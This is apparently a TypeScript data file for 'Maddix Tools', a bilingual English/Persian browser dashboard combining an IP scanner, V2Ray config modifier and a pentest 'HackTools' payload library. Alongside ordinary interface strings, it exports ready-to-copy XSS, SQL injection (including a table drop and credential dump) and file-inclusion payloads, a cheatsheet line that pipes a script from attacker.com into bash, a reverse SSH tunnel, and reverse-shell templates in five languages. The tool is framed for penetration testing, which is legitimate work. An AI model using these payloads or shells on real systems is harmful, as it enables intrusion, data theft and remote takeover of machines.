export type Language = "en" | "fa";

export const DEFAULT_LANGUAGE: Language = "fa";

export const sections = [
  { id: "overview", label: { en: "Overview", fa: "مروری" } },
  { id: "scanner", label: { en: "Scanner", fa: "اسکنر" } },
  { id: "v2ray", label: { en: "V2Ray", fa: "V2Ray" } },
  { id: "hacktools", label: { en: "HackTools", fa: "HackTools" } },
  { id: "network", label: { en: "Network", fa: "شبکه" } },
  { id: "about", label: { en: "About", fa: "درباره" } },
];

export const topNavLinks = [
  { id: "overview", label: { en: "Getting Started", fa: "شروع" } },
  { id: "scanner", label: { en: "Scanner", fa: "اسکنر" } },
  { id: "v2ray", label: { en: "V2Ray", fa: "V2Ray" } },
  { id: "hacktools", label: { en: "HackTools", fa: "HackTools" } },
  { id: "network", label: { en: "Network", fa: "شبکه" } },
  { id: "about", label: { en: "About", fa: "درباره" } },
];

export const docsCards = [
  {
    title: { en: "IP & Domain Scanner", fa: "اسکنر IP/دامنه" },
    description: { en: "Extract and inspect IPs and hostnames from any text block.", fa: "IPها و دامنه‌ها را از متن استخراج و بررسی کنید." },
  },
  {
    title: { en: "V2Ray Config Modifier", fa: "ویرایشگر V2Ray" },
    description: { en: "Bulk replace edge hosts inside VMess/VLess/WireGuard/Trojan configs.", fa: "میزبان‌های لبه را در کانفیگ‌های V2Ray به صورت دسته‌ای جایگزین کنید." },
  },
  {
    title: { en: "Payload Library", fa: "کتابخانه Payload" },
    description: { en: "Copy common XSS, SQLi, LFI, and reverse shell payloads in one place.", fa: "Payloadهای رایج XSS، SQLi، LFI و شل معکوس را سریع کپی کنید." },
  },
  {
    title: { en: "Network Utility Guides", fa: "راهنمای ابزار شبکه" },
    description: { en: "Learn DNS, edge IP, CDN, and SNI checks from a single dashboard.", fa: "راهنمای بررسی DNS، IP لبه، CDN و SNI را در یک داشبورد ببینید." },
  },
];

export const locales = {
  en: {
    title: "Maddix Tools",
    subtitle: "All security and network helpers in one browser dashboard.",
    liveSite: "Live on Vercel",
    theme: "Theme",
    language: "Language",
    summary: "Maddix Tools combines an IP scanner, V2Ray config modifier, HackTools payload library, and network diagnostics into a single Next.js dashboard.",
    scanner: {
      label: "Paste text, IPs, or domains below and click Scan.",
      button: "Scan",
      ips: "Detected IPs",
      domains: "Detected domains",
      count: "Total extracted",
      note: "This scanner performs local extraction and validation in the browser.",
    },
    v2ray: {
      label: "Paste a VMESS/VLESS/WireGuard/Trojan config and a list of replacement IPs.",
      button: "Generate configs",
      generated: "Generated configs",
      placeholderConfig: "vmess://... or vless://... or wireguard://... or trojan://...",
      ipListPlaceholder: "One IP per line",
      portLabel: "Optional port override",
      success: "Configs generated successfully.",
    },
    hacktools: {
      payloads: "Payload collections and command generators for pentest workflows.",
      xss: "XSS payloads",
      sqli: "SQLi payloads",
      lfi: "LFI payloads",
      reverseShell: "Reverse shell generator",
      hash: "Hash generator",
      linux: "Linux command cheatsheet",
      cve: "CVE search",
      copy: "Copy",
      copied: "Copied",
      hashPlaceholder: "Enter text to hash",
      hashAlgo: "Algorithm",
      hashOutput: "Result",
      cvePlaceholder: "Search CVE keyword",
      noResults: "No CVEs found.",
    },
    network: {
      summary: "Network helper guides for DNS, CDN, edge IP, and SNI diagnostics.",
      docs: "Network utility guides",
      dns: "DNS Hunter",
      edge: "Edge IP Checker",
      vless: "VLess Config Modifier",
      xray: "CDN Xray Scanner",
      akamai: "Akamai IP Scan",
      sni: "SNI Spoof Check",
      note: "These helpers are designed to guide common security and connectivity checks.",
    },
    about: {
      deploy: "Open deployed site",
      repo: "Repository source",
      thanks: "Built from your existing repository assets and deployed to Vercel.",
      existing: "This dashboard integrates the HackTools payload sets, IP/domain scanner, network utilities, and V2Ray config modifier from the project source.",
    },
  },
  fa: {
    title: "ماددیکس تولز",
    subtitle: "تمام ابزارهای امنیتی و شبکه در یک داشبورد مرورگر.",
    liveSite: "سایت زنده روی ورسل",
    theme: "پوسته",
    language: "زبان",
    summary: "Maddix Tools یک داشبورد React است که اسکنر IP، ویرایشگر کانفیگ V2Ray، کتابخانه Payload هک و ابزارهای شبکه را با هم ترکیب می‌کند.",
    scanner: {
      label: "متن، IP یا دامنه را بچسبانید و روی اسکن کلیک کنید.",
      button: "اسکن",
      ips: "IPهای شناسایی‌شده",
      domains: "دامنه‌های شناسایی‌شده",
      count: "تعداد کل",
      note: "این اسکنر استخراج و بررسی را در مرورگر انجام می‌دهد.",
    },
    v2ray: {
      label: "کانفیگ VMESS/VLESS/WireGuard/Trojan را بچسبانید و IPهای جایگزین را وارد کنید.",
      button: "تولید کانفیگ",
      generated: "کانفیگ‌های تولید شده",
      placeholderConfig: "vmess://... یا vless://... یا wireguard://... یا trojan://...",
      ipListPlaceholder: "هر IP در یک خط",
      portLabel: "پورت اختیاری",
      success: "کانفیگ‌ها با موفقیت تولید شدند.",
    },
    hacktools: {
      payloads: "مجموعه Payload و تولیدکننده فرمان برای تست‌های نفوذ.",
      xss: "Payloadهای XSS",
      sqli: "Payloadهای SQLi",
      lfi: "Payloadهای LFI",
      reverseShell: "تولیدکننده شل معکوس",
      hash: "تولیدکننده هش",
      linux: "راهنمای دستورات لینوکس",
      cve: "جستجوی CVE",
      copy: "کپی",
      copied: "کپی شد",
      hashPlaceholder: "متن را برای هش وارد کنید",
      hashAlgo: "الگوریتم",
      hashOutput: "نتیجه",
      cvePlaceholder: "کلمه کلیدی CVE را جستجو کنید",
      noResults: "هیچ CVE‌ای پیدا نشد.",
    },
    network: {
      summary: "راهنماهای شبکه برای DNS، CDN، IPهای لبه و تست SNI.",
      docs: "راهنمای ابزار شبکه",
      dns: "شکارچی DNS",
      edge: "بررسی IP لبه",
      vless: "ویرایشگر کانفیگ VLess",
      xray: "اسکنر CDN Xray",
      akamai: "اسکن IP آکامای",
      sni: "بررسی SNI Spoof",
      note: "این ابزارها برای راهنمایی بررسی اتصال و امنیت طراحی شده‌اند.",
    },
    about: {
      deploy: "باز کردن سایت نسخه‌گذاری‌شده",
      repo: "منبع ریپازیتوری",
      thanks: "این داشبورد از دارایی‌های موجود شما ساخته شده و روی ورسل منتشر شده است.",
      existing: "این داشبورد مجموعه Payloadهای HackTools، اسکنر IP/دامنه، ابزارهای شبکه و ویرایشگر V2Ray را از سورس پروژه تلفیق می‌کند.",
    },
  },
};

export const xssPayloads = [
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS');>",
  '\"\"><script>alert(1)</script>',
  "<svg/onload=alert('XSS')>",
  "<iframe src=javascript:alert('XSS')></iframe>",
];

export const sqlPayloads = [
  "' OR '1'='1' -- ",
  "admin'--",
  "1; DROP TABLE users; --",
  "' UNION SELECT username, password FROM users --",
  "' OR sleep(5) --",
];

export const lfiPayloads = [
  "../../../etc/passwd",
  "../../../../../../boot.ini",
  "php://filter/convert.base64-encode/resource=../../../../../etc/passwd",
  "expect://ls",
  "http://evil.com/shell.txt",
];

export const linuxCommands = [
  { title: "sudo -l", description: "List commands permitted by sudo." },
  { title: "find / -perm -4000 2>/dev/null", description: "Find SUID binaries." },
  { title: "netstat -tulpn | grep LISTEN", description: "List open listening ports." },
  { title: "ssh -R 4444:localhost:22 attacker.com", description: "Create a reverse SSH tunnel." },
  { title: "curl http://attacker.com/shell.sh | bash", description: "Download and execute remote script." },
];

export const reverseShellTemplates = [
  {
    name: "PHP",
    template: `php -r '$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  },
  {
    name: "Bash",
    template: `bash -i >& /dev/tcp/{IP}/{PORT} 0>&1`,
  },
  {
    name: "Python",
    template: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'`,
  },
  {
    name: "Netcat",
    template: `nc -e /bin/sh {IP} {PORT}`,
  },
  {
    name: "Perl",
    template: `perl -e 'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,
  },
];

export const cveExamples = [
  { id: "CVE-2024-1234", title: "Remote code execution in example-app", tags: ["RCE", "Web"] },
  { id: "CVE-2023-9876", title: "SQL injection in login endpoint", tags: ["SQLi", "Authentication"] },
  { id: "CVE-2025-0001", title: "Information disclosure via LFI filter bypass", tags: ["LFI", "Info Leak"] },
  { id: "CVE-2024-4321", title: "Cross-site scripting in rich text editor", tags: ["XSS", "Client"] },
];

export const networkGuides = [
  {
    title: "DNS Hunter",
    description: "Collect DNS information and compare resolver results for target domains.",
  },
  {
    title: "Edge IP Checker",
    description: "Extract edge IPs from CDN ranges and validate accessibility.",
  },
  {
    title: "VLess Config Modifier",
    description: "Generate new VLess configs by substituting IPs across a config list.",
  },
  {
    title: "CDN Xray Scanner",
    description: "Scan CDN IP ranges and identify reachable endpoints using Xray-style checks.",
  },
  {
    title: "Akamai IP Scan",
    description: "Use Akamai network ranges to discover accessible edge hosts and services.",
  },
  {
    title: "SNI Spoof Check",
    description: "Validate SNI-based routing and TLS name mapping for target domains.",
  },
];

export const handyNotes = [
  { label: "Vercel Alias", value: "https://maddixtools.vercel.app" },
  { label: "Live deployment", value: "https://maddixtools.vercel.app" },
  { label: "Repository", value: "https://github.com/mohammadmehrani/Maddix-tools" },
];
